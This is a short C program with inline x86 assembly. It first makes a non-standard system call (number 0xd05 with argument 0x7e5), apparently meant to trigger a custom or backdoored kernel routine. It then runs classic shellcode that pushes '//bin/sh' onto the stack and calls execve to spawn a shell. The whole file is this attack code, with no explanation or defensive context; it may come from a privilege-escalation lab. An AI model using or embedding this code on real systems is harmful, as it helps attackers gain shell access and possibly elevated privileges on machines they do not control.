int main() {

	asm(
	"xor eax, eax\n"
	"xor ebx, ebx\n"
	"mov ebx, 0x7e5\n"
	"mov eax, 0xd05\n"
	"int 0x80\n"

	"xor eax, eax\n"
	"push eax\n"
	"push 0x68732f6e\n"
	"push 0x69622f2f\n"
	"mov ebx, esp\n"
	"mov ecx, 0x0\n"
	"mov edx, 0x0\n"
	"mov eax, 11\n"
	"int 0x80\n"
	   );

	return 0;

}
